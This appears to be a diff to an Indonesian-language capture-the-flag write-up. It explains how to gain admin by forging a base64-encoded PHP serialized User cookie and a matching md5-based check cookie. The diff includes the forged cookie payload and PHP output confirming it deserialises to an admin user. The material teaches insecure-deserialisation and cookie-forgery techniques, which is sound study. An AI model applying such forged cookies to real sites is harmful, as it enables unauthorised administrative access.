@@ -1,8 +1,7 @@
-* Cookie auth merupakan serialize dari objek User dengan user-> admmin dan pass-> True + diencode ke base64. Adapun cookie check merupakan hasil encode base64 dari md5 cookie auth. 
-Jadi untuk mendaptkan admin, peserta harus membuat payload objek untuk diserialize yang benar (seperti di bawah) dan mengencodenya ke base64 sebagai cookie auth. Lalu menghash md5 
+* Cookie auth merupakan serialize dari objek User dengan user-> admmin dan pass-> True + diencode ke base64. Adapun cookie check merupakan hasil encode base64 dari md5       cookie auth. Jadi untuk mendaptkan admin, peserta harus membuat payload objek untuk diserialize yang benar (seperti di bawah) dan mengencodenya ke base64 sebagai cookie auth. Lalu menghash md5 
 dari hasil cookie auth sebagai cookie check. 
 
-Lebih lengkap:
+  Lebih lengkap:
   ```
   <?php
   $_COOKIE['auth'] = 'Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30=';
@@ -21,3 +20,16 @@ Lebih lengkap:
 
   }
   ```
+  
+  ```
+  string(32) "6897f0060a84ecb0600e4167d2a748e4"
+  string(32) "6897f0060a84ecb0600e4167d2a748e4"
+  object(__PHP_Incomplete_Class)#1 (3) {
+  ["__PHP_Incomplete_Class_Name"]=>
+  string(4) "User"
+  ["user"]=>
+  string(5) "admin"
+  ["pass"]=>
+  bool(true)
+}
+```
